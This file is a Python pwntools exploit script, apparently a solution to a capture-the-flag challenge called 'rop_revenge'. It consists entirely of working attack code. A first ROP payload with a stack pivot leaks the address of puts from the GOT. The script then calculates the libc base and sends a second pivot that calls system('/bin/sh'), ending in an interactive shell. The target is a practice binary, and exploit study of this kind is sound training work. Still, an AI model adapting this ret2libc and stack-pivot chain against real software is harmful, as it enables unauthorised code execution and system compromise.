from pwn import *

p = process('./rop_revenge')
elf = ELF('./rop_revenge')
libc = elf.libc

main = elf.sym['main']
name = 0x601080
pop_rdi = 0x400723
putsGOT = elf.got['puts']
putsPLT = elf.plt['puts']
leave = 0x4006bd
pop_rbp = 0x4005a0
ret = 0x4004c9

payload = b'a'*0x100 + p64(name+0x100) + p64(pop_rdi) + p64(putsGOT) + p64(putsPLT) + p64(pop_rbp) + p64(0x00602000 - 0x100) + p64(0x400693)
p.sendafter('name?', payload)

payload = b'a'*32 + p64(name+0x100) + p64(leave)
p.sendafter('say?', payload)

p.recvuntil('away~\n')
puts = u64(p.recvline().strip().ljust(8, b'\x00'))
base = puts - libc.sym['puts']
success('libc base = 0x%x', base)
system = base + libc.sym['system']
sh = base + next(libc.search(b'/bin/sh\x00'))

payload = p64(pop_rdi) + p64(sh) + p64(system) + p64(ret) + p64(0x00602000-0x100-0x20-8) + p64(leave)
p.send(payload)

p.interactive()